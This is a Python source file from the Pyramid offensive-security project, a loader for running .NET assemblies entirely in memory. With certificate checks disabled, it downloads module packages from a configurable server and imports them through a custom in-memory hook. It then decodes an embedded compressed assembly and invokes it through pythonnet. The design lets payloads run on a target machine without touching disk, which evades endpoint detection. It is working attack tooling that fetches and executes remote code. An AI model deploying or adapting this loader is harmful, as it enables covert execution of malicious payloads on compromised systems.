'''
Author: @snovvcrash (c) 2022

Description: Pyramid Base script for executing .NET assemblies in-memory.

Instructions: See README on https://github.com/naksyn/Pyramid

Credits:
  - @naksyn (Pyramid Project)

Copyright 2022
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE
OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
'''

import os
import base64
import ssl
import importlib
import zipfile
import urllib.request
import sys
import io

###### CHANGE THIS ##########
pyramid_server = '192.168.1.1'
pyramid_port = '443'
pyramid_user = 'testuser'
pyramid_pass = 'Sup3rP4ss!'
#############################

cwd = os.getcwd()

fileName = 'pythonnet.zip'
print("[*] Downloading and unpacking pythonnet: " + fileName)

gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
gcontext.check_hostname = False
gcontext.verify_mode = ssl.CERT_NONE
request = urllib.request.Request('https://'+ pyramid_server + ':' + pyramid_port + '/' + fileName)
base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
with urllib.request.urlopen(request, context=gcontext) as response:
   zip_web = response.read()
   
with zipfile.ZipFile(io.BytesIO(zip_web), 'r') as zip_ref:
	zip_ref.extractall(cwd)


#### MODULE IMPORTER ####

moduleRepo = {}
_meta_cache = {}

# [0] = .py ext, is_package = False
# [1] = /__init__.py ext, is_package = True
_search_order = [('.py', False), ('/__init__.py', True)]


class ZipImportError(ImportError):
	"""Exception raised by zipimporter objects."""

# _get_info() = takes the fullname, then subpackage name (if applicable),
# and searches for the respective module or package


class CFinder(object):
	"""Import Hook"""
	def __init__(self, repoName):
		self.repoName = repoName
		self._source_cache = {}

	def _get_info(self, repoName, fullname):
		"""Search for the respective package or module in the zipfile object"""
		parts = fullname.split('.')
		submodule = parts[-1]
		modulepath = '/'.join(parts)

		#check to see if that specific module exists

		for suffix, is_package in _search_order:
			relpath = modulepath + suffix
			try:
				moduleRepo[repoName].getinfo(relpath)
			except KeyError:
				pass
			else:
				return submodule, is_package, relpath

		#Error out if we can find the module/package
		msg = ('Unable to locate module %s in the %s repo' % (submodule, repoName))
		raise ZipImportError(msg)

	def _get_source(self, repoName, fullname):
		"""Get the source code for the requested module"""
		submodule, is_package, relpath = self._get_info(repoName, fullname)
		fullpath = '%s/%s' % (repoName, relpath)
		if relpath in self._source_cache:
			source = self._source_cache[relpath]
			return submodule, is_package, fullpath, source
		try:
			### added .decode
			source =  moduleRepo[repoName].read(relpath).decode()
			#print(source)
			source = source.replace('\r\n', '\n')
			source = source.replace('\r', '\n')
			self._source_cache[relpath] = source
			return submodule, is_package, fullpath, source
		except:
			raise ZipImportError("Unable to obtain source for module %s" % (fullpath))

	def find_module(self, fullname, path=None):
		try:
			submodule, is_package, relpath = self._get_info(self.repoName, fullname)
		except ImportError:
			return None
		else:
			return self

	def load_module(self, fullname):
		submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
		code = compile(source, fullpath, 'exec')
		spec = importlib.util.spec_from_loader(fullname, loader=None)
		mod = sys.modules.setdefault(fullname, importlib.util.module_from_spec(spec))
		mod.__loader__ = self
		mod.__file__ = fullpath
		mod.__name__ = fullname
		if is_package:
			mod.__path__ = [os.path.dirname(mod.__file__)]
		exec(code,mod.__dict__)
		return mod

	def get_data(self, fullpath):
		prefix = os.path.join(self.repoName, '')
		if not fullpath.startswith(prefix):
			raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
		relpath = fullpath[len(prefix):]
		try:
			return moduleRepo[self.repoName].read(relpath)
		except KeyError:
			raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))

	def is_package(self, fullname):
		"""Return if the module is a package"""
		submodule, is_package, relpath = self._get_info(self.repoName, fullname)
		return is_package

	def get_code(self, fullname):
		submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
		return compile(source, fullpath, 'exec')

def install_hook(repoName):
	if repoName not in _meta_cache:
		finder = CFinder(repoName)
		_meta_cache[repoName] = finder
		sys.meta_path.append(finder)

def remove_hook(repoName):
	if repoName in _meta_cache:
		finder = _meta_cache.pop(repoName)
		sys.meta_path.remove(finder)

def hook_routine(fileName,zip_web):
	#print(zip_web)
	zf=zipfile.ZipFile(io.BytesIO(zip_web), 'r')
	#print(zf)
	moduleRepo[fileName]=zf
	install_hook(fileName)


zip_list = [
	'cffi',
	'pycparser'
]

for zip_name in zip_list:
	try:
		print("[*] Loading in memory module package: " + zip_name)
		gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
		gcontext.check_hostname = False
		gcontext.verify_mode = ssl.CERT_NONE
		request = urllib.request.Request('https://'+ pyramid_server + ':' + pyramid_port + '/' + zip_name + '.zip')
		base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
		request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
		with urllib.request.urlopen(request, context=gcontext) as response:
			zip_web = response.read()
			hook_routine(zip_name, zip_web)
	except Exception as e:
		print(e)

print("[*] Modules imported")


import clr
import zlib
import base64

clr.AddReference('System')
from System import *
from System.Reflection import *

'''
import zlib
from base64 import b64encode

with open('Program.exe', 'rb') as f:
	print(b64encode(zlib.compress(f.read(), level=9)))  # <ASSEMBLY_BYTES_BASE64>
'''

b64 = base64.b64encode(zlib.decompress(base64.b64decode(b'<ASSEMBLY_BYTES_BASE64>'))).decode()
raw = Convert.FromBase64String(b64)

assembly = Assembly.Load(raw)
type = assembly.GetType('Namespace.Type')
type.GetMethod('Method').Invoke(Activator.CreateInstance(type), None)
